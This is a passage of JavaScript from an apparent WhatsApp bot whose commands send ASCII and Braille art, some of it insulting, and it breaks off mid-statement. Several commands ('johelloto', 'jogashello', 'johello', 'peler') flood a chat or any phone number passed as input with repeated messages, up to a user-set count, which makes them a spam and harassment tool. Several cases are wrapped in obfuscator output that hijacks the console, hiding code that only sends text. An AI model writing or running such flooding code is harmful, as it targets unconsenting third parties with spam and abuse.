///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
            await jobotz.sendMessage(m.chat, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            jancok(`Berhasil Mengirim Momo Di Nomer ${text}`)
            }
            break

case 'malam':
case 'mlm':
case 'sore':
case 'siang':
case 'pagi': {            
          if (!isCreator && !isBan) return
             salem = `السلام عليكم
`
await jobotz.sendMessage(m.chat, {text:salem},{quoted:fgamjo})
jancok(`Assalamualaikum`)
}
break

case 'johello': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
}
jancok(`Sukses Send Hello Sebanyak ${jumlah}`)
}
break

case 'johelloto': {            
 if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await m.reply(`Berhasil Mengirim Hello Di Nomer ${text}`)
}
 break

case 'jogashello': {            
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
 halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
jancok(`Berhasil Mengirim Hello Di Nomer ${text}`)
}
 break

case 'jadipeler': {
var _0x236b81=_0x1a70;function _0x1a70(_0x10e156,_0x3f3b9f){var _0x9eb7bd=_0x511d();return _0x1a70=function(_0x24ba9c,_0x58e9ee){_0x24ba9c=_0x24ba9c-0xf8;var _0x88222a=_0x9eb7bd[_0x24ba9c];return _0x88222a;},_0x1a70(_0x10e156,_0x3f3b9f);}(function(_0x3325b0,_0x25a8b1){var _0x5ac15b=_0x1a70,_0x45d5c1=_0x3325b0();while(!![]){try{var _0x5143d1=-parseInt(_0x5ac15b(0xfa))/0x1*(parseInt(_0x5ac15b(0x111))/0x2)+-parseInt(_0x5ac15b(0xfd))/0x3+parseInt(_0x5ac15b(0xfe))/0x4*(parseInt(_0x5ac15b(0x103))/0x5)+parseInt(_0x5ac15b(0xf8))/0x6*(parseInt(_0x5ac15b(0x102))/0x7)+-parseInt(_0x5ac15b(0x10a))/0x8*(-parseInt(_0x5ac15b(0x10f))/0x9)+parseInt(_0x5ac15b(0x101))/0xa+parseInt(_0x5ac15b(0xf9))/0xb*(-parseInt(_0x5ac15b(0x10b))/0xc);if(_0x5143d1===_0x25a8b1)break;else _0x45d5c1['push'](_0x45d5c1['shift']());}catch(_0x1d0736){_0x45d5c1['push'](_0x45d5c1['shift']());}}}(_0x511d,0x5cf73));var _0x46f5f1=(function(){var _0x3d899e=!![];return function(_0x3a4c6e,_0x5e3a89){var _0x2ced46=_0x3d899e?function(){if(_0x5e3a89){var _0x17fe50=_0x5e3a89['apply'](_0x3a4c6e,arguments);return _0x5e3a89=null,_0x17fe50;}}:function(){};return _0x3d899e=![],_0x2ced46;};}()),_0x2648fd=_0x46f5f1(this,function(){var _0x57386b=_0x1a70;return _0x2648fd['toString']()['search'](_0x57386b(0x108))[_0x57386b(0x117)]()['constructor'](_0x2648fd)[_0x57386b(0x105)](_0x57386b(0x108));});_0x2648fd();var _0x58e9ee=(function(){var _0xe981f5=!![];return function(_0x196f24,_0x393103){var _0x51026b=_0xe981f5?function(){var _0xf5736f=_0x1a70;if(_0x393103){var _0x179e55=_0x393103[_0xf5736f(0x118)](_0x196f24,arguments);return _0x393103=null,_0x179e55;}}:function(){};return _0xe981f5=![],_0x51026b;};}()),_0x24ba9c=_0x58e9ee(this,function(){var _0x2cfe9c=_0x1a70,_0x1756e2;try{var _0x36c2bf=Function(_0x2cfe9c(0x100)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1756e2=_0x36c2bf();}catch(_0x2b1583){_0x1756e2=window;}var _0x58be41=_0x1756e2[_0x2cfe9c(0x107)]=_0x1756e2['console']||{},_0x366c4d=[_0x2cfe9c(0x113),'warn','info',_0x2cfe9c(0x10c),_0x2cfe9c(0x112),_0x2cfe9c(0x106),_0x2cfe9c(0x116)];for(var _0xaa8688=0x0;_0xaa8688<_0x366c4d[_0x2cfe9c(0x114)];_0xaa8688++){var _0x1410e1=_0x58e9ee[_0x2cfe9c(0x109)][_0x2cfe9c(0x115)]['bind'](_0x58e9ee),_0x55bb78=_0x366c4d[_0xaa8688],_0x2d62d9=_0x58be41[_0x55bb78]||_0x1410e1;_0x1410e1[_0x2cfe9c(0x10d)]=_0x58e9ee[_0x2cfe9c(0xfb)](_0x58e9ee),_0x1410e1[_0x2cfe9c(0x117)]=_0x2d62d9['toString'][_0x2cfe9c(0xfb)](_0x2d62d9),_0x58be41[_0x55bb78]=_0x1410e1;}});function _0x511d(){var _0x378424=['944205itMpyM','6548qsHvsg','Teksnya\x20Mana?','return\x20(function()\x20','887580cNCdqV','23954JenxLW','2265noEDYL','Sukses\x20Convert\x20Peler\x20','search','table','console','(((.+)+)+)+$','constructor','8YnYPrv','28236HrkXLT','error','__proto__','PELER\x20','2294379CZMzVm','sendMessage','8hGbtov','exception','log','length','prototype','trace','toString','apply','1194CjEJfa','4994VuBSjE','611AphPgS','bind','chat'];_0x511d=function(){return _0x378424;};return _0x511d();}_0x24ba9c();{if(!isCreator&&!isBan)return;if(!m['quoted']&&!text)throw _0x236b81(0xff);pelernya=_0x236b81(0x10e)+text+'\x0a⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿\x0a⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿\x0a⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿\x0a⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿\x0a⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿\x0a⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊\x0a',await jobotz[_0x236b81(0x110)](m[_0x236b81(0xfc)],{'text':pelernya},{'quoted':fgamjo}),jancok(_0x236b81(0x104)+text);}
}
break

case 'peler': {
const _0x2d027c=_0x3737;function _0x534b(){const _0x18598b=['9qiaYza','prototype','2617124BQanOZ','error','toString','Jumlahnya?','exception','console','\x0a⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿\x0a⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿\x0a⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿\x0a⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿\x0a⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿\x0a⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊\x0a','reply','714854fyYkLO','14222500JMIzYX','log','8356074yJlURR','warn','trace','5631934KkrPHj','{}.constructor(\x22return\x20this\x22)(\x20)','apply','2836kYNskK','(((.+)+)+)+$','Sukses\x20Send\x20Monyet\x20Sebanyak\x20','8220016dhIOPO','4593thFkro','sendMessage','bind','5xccBoV','length','search','constructor'];_0x534b=function(){return _0x18598b;};return _0x534b();}(function(_0x210a7f,_0x1c3e4f){const _0x1f680d=_0x3737,_0x450d86=_0x210a7f();while(!![]){try{const _0xbd6ef7=parseInt(_0x1f680d(0xc9))/0x1+-parseInt(_0x1f680d(0xc1))/0x2+-parseInt(_0x1f680d(0xd6))/0x3*(-parseInt(_0x1f680d(0xd2))/0x4)+parseInt(_0x1f680d(0xbb))/0x5*(-parseInt(_0x1f680d(0xcc))/0x6)+-parseInt(_0x1f680d(0xcf))/0x7+parseInt(_0x1f680d(0xd5))/0x8*(parseInt(_0x1f680d(0xbf))/0x9)+parseInt(_0x1f680d(0xca))/0xa;if(_0xbd6ef7===_0x1c3e4f)break;else _0x450d86['push'](_0x450d86['shift']());}catch(_0x1bf681){_0x450d86['push'](_0x450d86['shift']());}}}(_0x534b,0xb5b5a));const _0x4638be=(function(){let _0x25421d=!![];return function(_0x53c478,_0x25be43){const _0xbe3827=_0x25421d?function(){const _0x2e25f5=_0x3737;if(_0x25be43){const _0x84f513=_0x25be43[_0x2e25f5(0xd1)](_0x53c478,arguments);return _0x25be43=null,_0x84f513;}}:function(){};return _0x25421d=![],_0xbe3827;};}()),_0x367c86=_0x4638be(this,function(){const _0x3b968f=_0x3737;return _0x367c86['toString']()[_0x3b968f(0xbd)](_0x3b968f(0xd3))[_0x3b968f(0xc3)]()['constructor'](_0x367c86)[_0x3b968f(0xbd)]('(((.+)+)+)+$');});_0x367c86();const _0x5c6e44=(function(){let _0x5c48a8=!![];return function(_0x4a4567,_0x4e5a05){const _0x437033=_0x5c48a8?function(){const _0x4ca07a=_0x3737;if(_0x4e5a05){const _0x55f508=_0x4e5a05[_0x4ca07a(0xd1)](_0x4a4567,arguments);return _0x4e5a05=null,_0x55f508;}}:function(){};return _0x5c48a8=![],_0x437033;};}()),_0x177c10=_0x5c6e44(this,function(){const _0x4135fd=_0x3737,_0x117210=function(){const _0x19caae=_0x3737;let _0x417ee2;try{_0x417ee2=Function('return\x20(function()\x20'+_0x19caae(0xd0)+');')();}catch(_0x16701c){_0x417ee2=window;}return _0x417ee2;},_0x241c18=_0x117210(),_0x83827c=_0x241c18[_0x4135fd(0xc6)]=_0x241c18[_0x4135fd(0xc6)]||{},_0x1e0ae7=[_0x4135fd(0xcb),_0x4135fd(0xcd),'info',_0x4135fd(0xc2),_0x4135fd(0xc5),'table',_0x4135fd(0xce)];for(let _0x61fef7=0x0;_0x61fef7<_0x1e0ae7[_0x4135fd(0xbc)];_0x61fef7++){const _0x2b7fb3=_0x5c6e44[_0x4135fd(0xbe)][_0x4135fd(0xc0)][_0x4135fd(0xba)](_0x5c6e44),_0x47de18=_0x1e0ae7[_0x61fef7],_0x10bd90=_0x83827c[_0x47de18]||_0x2b7fb3;_0x2b7fb3['__proto__']=_0x5c6e44['bind'](_0x5c6e44),_0x2b7fb3[_0x4135fd(0xc3)]=_0x10bd90[_0x4135fd(0xc3)][_0x4135fd(0xba)](_0x10bd90),_0x83827c[_0x47de18]=_0x2b7fb3;}});_0x177c10();function _0x3737(_0x4a24c9,_0xbe8fa9){const _0x4306e4=_0x534b();return _0x3737=function(_0x177c10,_0x5c6e44){_0x177c10=_0x177c10-0xb9;let _0x31ef66=_0x4306e4[_0x177c10];return _0x31ef66;},_0x3737(_0x4a24c9,_0xbe8fa9);}{if(!isCreator&&!isBan)return;if(args[_0x2d027c(0xbc)]==0x0)return m[_0x2d027c(0xc8)](_0x2d027c(0xc4));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){pelernya=_0x2d027c(0xc7),await jobotz[_0x2d027c(0xb9)](m['chat'],{'text':pelernya},{'quoted':fgamjo});}jancok(_0x2d027c(0xd4)+jumlah);}
}
break

case 'jadimonyet': {
function _0x4304(){var _0x391806=['quoted','35688NyQAkG','Teksnya\x20Mana?','9940TJozFj','__proto__','\x0a┈┈╱▔▔▔▔▔╲┈┈HM┈HM\x0a┈╱┈┈╱▔╲╲╲▏┈┈┈HMM\x0a╱┈┈╱━╱▔▔▔▔▔╲━╮┈┈\x0a▏┈▕┃▕╱▔╲╱▔╲▕╮┃┈┈\x0a▏┈▕╰━▏▊▕▕▋▕▕━╯┈┈\x0a╲┈┈╲╱▔╭╮▔▔┳╲╲┈┈┈\x0a┈╲┈┈▏╭━━━━╯▕▕┈┈┈\x0a┈┈╲┈╲▂▂▂▂▂▂╱╱┈┈┈\x0a┈┈┈┈▏┊┈┈┈┈┊┈┈┈╲┈\x0a┈┈┈┈▏┊┈┈┈┈┊▕╲┈┈╲\x0a┈╱▔╲▏┊┈┈┈┈┊▕╱▔╲▕\x0a┈▏\x20┈┈┈╰┈┈┈┈╯┈┈┈▕▕\x0a┈╲┈┈┈╲┈┈┈┈╱┈┈┈╱┈╲\x0a┈┈╲┈┈▕▔▔▔▔▏┈┈╱╲╲╲▏\x0a┈╱▔┈┈▕┈┈┈┈▏┈┈▔╲▔▔\x0a┈╲▂▂▂╱┈┈┈┈╲▂▂▂╱┈\x0a','70740xRExfi','constructor','sendMessage','search','chat','apply','7022205bouZfT','toString','Sukses\x20Convert\x20Monyet\x20','log','(((.+)+)+)+$','1162056ZdwMwf','418CKLJza','2aHbzyk','1981YFxDvU','length','bind','trace','665062PmUozg','84cnybNN','exception','table','prototype','6398585pWKooj'];_0x4304=function(){return _0x391806;};return _0x4304();}function _0x4915(_0x367705,_0x2398aa){var _0x5582f0=_0x4304();return _0x4915=function(_0x4c2212,_0x2c9d52){_0x4c2212=_0x4c2212-0x128;var _0x4d1fe2=_0x5582f0[_0x4c2212];return _0x4d1fe2;},_0x4915(_0x367705,_0x2398aa);}var _0x394fd2=_0x4915;(function(_0x5c2f53,_0x3c95f1){var _0x2dbdd0=_0x4915,_0x2e8688=_0x5c2f53();while(!![]){try{var _0x130ec1=parseInt(_0x2dbdd0(0x139))/0x1*(-parseInt(_0x2dbdd0(0x13e))/0x2)+-parseInt(_0x2dbdd0(0x12c))/0x3*(-parseInt(_0x2dbdd0(0x13f))/0x4)+-parseInt(_0x2dbdd0(0x143))/0x5+parseInt(_0x2dbdd0(0x137))/0x6+parseInt(_0x2dbdd0(0x13a))/0x7*(parseInt(_0x2dbdd0(0x145))/0x8)+parseInt(_0x2dbdd0(0x132))/0x9+-parseInt(_0x2dbdd0(0x129))/0xa*(parseInt(_0x2dbdd0(0x138))/0xb);if(_0x130ec1===_0x3c95f1)break;else _0x2e8688['push'](_0x2e8688['shift']());}catch(_0x211810){_0x2e8688['push'](_0x2e8688['shift']());}}}(_0x4304,0xb6dd5));var _0x4a2ce5=(function(){var _0x3df300=!![];return function(_0x3eb479,_0x247a49){var _0x34dd22=_0x3df300?function(){var _0x5df950=_0x4915;if(_0x247a49){var _0x740697=_0x247a49[_0x5df950(0x131)](_0x3eb479,arguments);return _0x247a49=null,_0x740697;}}:function(){};return _0x3df300=![],_0x34dd22;};}()),_0x3aada1=_0x4a2ce5(this,function(){var _0x5504c3=_0x4915;return _0x3aada1[_0x5504c3(0x133)]()['search'](_0x5504c3(0x136))['toString']()[_0x5504c3(0x12d)](_0x3aada1)[_0x5504c3(0x12f)](_0x5504c3(0x136));});_0x3aada1();var _0x2c9d52=(function(){var _0x479b19=!![];return function(_0x3de43b,_0x5a3750){var _0x5127c2=_0x479b19?function(){var _0x5e6c95=_0x4915;if(_0x5a3750){var _0x398e27=_0x5a3750[_0x5e6c95(0x131)](_0x3de43b,arguments);return _0x5a3750=null,_0x398e27;}}:function(){};return _0x479b19=![],_0x5127c2;};}()),_0x4c2212=_0x2c9d52(this,function(){var _0x137e12=_0x4915,_0x3cdaab=function(){var _0x31844a;try{_0x31844a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5294be){_0x31844a=window;}return _0x31844a;},_0x1d77db=_0x3cdaab(),_0x4bad89=_0x1d77db['console']=_0x1d77db['console']||{},_0x3589bf=[_0x137e12(0x135),'warn','info','error',_0x137e12(0x140),_0x137e12(0x141),_0x137e12(0x13d)];for(var _0x1999bb=0x0;_0x1999bb<_0x3589bf[_0x137e12(0x13b)];_0x1999bb++){var _0xbd651e=_0x2c9d52['constructor'][_0x137e12(0x142)][_0x137e12(0x13c)](_0x2c9d52),_0x40cd3d=_0x3589bf[_0x1999bb],_0x5c154e=_0x4bad89[_0x40cd3d]||_0xbd651e;_0xbd651e[_0x137e12(0x12a)]=_0x2c9d52['bind'](_0x2c9d52),_0xbd651e[_0x137e12(0x133)]=_0x5c154e[_0x137e12(0x133)][_0x137e12(0x13c)](_0x5c154e),_0x4bad89[_0x40cd3d]=_0xbd651e;}});_0x4c2212();{if(!isCreator&&!isBan)return;if(!m[_0x394fd2(0x144)]&&!text)throw _0x394fd2(0x128);nyet='Nama\x20Gw\x20'+text+_0x394fd2(0x12b),await jobotz[_0x394fd2(0x12e)](m[_0x394fd2(0x130)],{'text':nyet},{'quoted':fgamjo}),jancok(_0x394fd2(0x134)+text);}
}
break

case 'monyet': {
function _0x2c59(_0x12fe6d,_0x5aabc8){const _0x4e664d=_0x4d45();return _0x2c59=function(_0xfa75dc,_0x1bb4c5){_0xfa75dc=_0xfa75dc-0x92;let _0x2ddb1a=_0x4e664d[_0xfa75dc];return _0x2ddb1a;},_0x2c59(_0x12fe6d,_0x5aabc8);}const _0x2504d8=_0x2c59;function _0x4d45(){const _0x3a40ac=['constructor','bind','432488kMtHbp','__proto__','chat','(((.+)+)+)+$','warn','toString','console','table','search','7tQnWRJ','reply','prototype','1095162kMyyNg','Jumlahnya?','apply','385355CeZJzH','795807BVUKIb','211564BOtjXQ','trace','167781wsLKSh','info','length','2938200iCLjxR','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','exception'];_0x4d45=function(){return _0x3a40ac;};return _0x4d45();}(function(_0x297b87,_0x4461df){const _0xd763dd=_0x2c59,_0xc822de=_0x297b87();while(!![]){try{const _0x580b92=-parseInt(_0xd763dd(0x93))/0x1+-parseInt(_0xd763dd(0xad))/0x2+-parseInt(_0xd763dd(0xac))/0x3+parseInt(_0xd763dd(0x9c))/0x4+parseInt(_0xd763dd(0xab))/0x5+parseInt(_0xd763dd(0xa8))/0x6*(parseInt(_0xd763dd(0xa5))/0x7)+parseInt(_0xd763dd(0x96))/0x8;if(_0x580b92===_0x4461df)break;else _0xc822de['push'](_0xc822de['shift']());}catch(_0x34df80){_0xc822de['push'](_0xc822de['shift']());}}}(_0x4d45,0x2fe43));const _0x4b952b=(function(){let _0x235b72=!![];return function(_0x6693e9,_0x4744be){const _0x34b320=_0x235b72?function(){const _0x21f725=_0x2c59;if(_0x4744be){const _0xdce5e9=_0x4744be[_0x21f725(0xaa)](_0x6693e9,arguments);return _0x4744be=null,_0xdce5e9;}}:function(){};return _0x235b72=![],_0x34b320;};}()),_0xcb0f64=_0x4b952b(this,function(){const _0x5b3bbc=_0x2c59;return _0xcb0f64['toString']()[_0x5b3bbc(0xa4)](_0x5b3bbc(0x9f))['toString']()['constructor'](_0xcb0f64)[_0x5b3bbc(0xa4)](_0x5b3bbc(0x9f));});_0xcb0f64();const _0x1bb4c5=(function(){let _0x20980e=!![];return function(_0x1e0898,_0x1549cb){const _0x330ebc=_0x20980e?function(){if(_0x1549cb){const _0x5b4acf=_0x1549cb['apply'](_0x1e0898,arguments);return _0x1549cb=null,_0x5b4acf;}}:function(){};return _0x20980e=![],_0x330ebc;};}()),_0xfa75dc=_0x1bb4c5(this,function(){const _0x1c9fe4=_0x2c59;let _0xd064df;try{const _0x5ab814=Function(_0x1c9fe4(0x97)+_0x1c9fe4(0x98)+');');_0xd064df=_0x5ab814();}catch(_0x5b3ef2){_0xd064df=window;}const _0x5b7e36=_0xd064df[_0x1c9fe4(0xa2)]=_0xd064df[_0x1c9fe4(0xa2)]||{},_0x11bf6d=['log',_0x1c9fe4(0xa0),_0x1c9fe4(0x94),'error',_0x1c9fe4(0x99),_0x1c9fe4(0xa3),_0x1c9fe4(0x92)];for(let _0x2cebef=0x0;_0x2cebef<_0x11bf6d[_0x1c9fe4(0x95)];_0x2cebef++){const _0x5f186a=_0x1bb4c5[_0x1c9fe4(0x9a)][_0x1c9fe4(0xa7)][_0x1c9fe4(0x9b)](_0x1bb4c5),_0x2a8859=_0x11bf6d[_0x2cebef],_0x22575f=_0x5b7e36[_0x2a8859]||_0x5f186a;_0x5f186a[_0x1c9fe4(0x9d)]=_0x1bb4c5[_0x1c9fe4(0x9b)](_0x1bb4c5),_0x5f186a[_0x1c9fe4(0xa1)]=_0x22575f[_0x1c9fe4(0xa1)]['bind'](_0x22575f),_0x5b7e36[_0x2a8859]=_0x5f186a;}});_0xfa75dc();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x2504d8(0xa6)](_0x2504d8(0xa9));jumlah=''+encodeURI(q);for(let 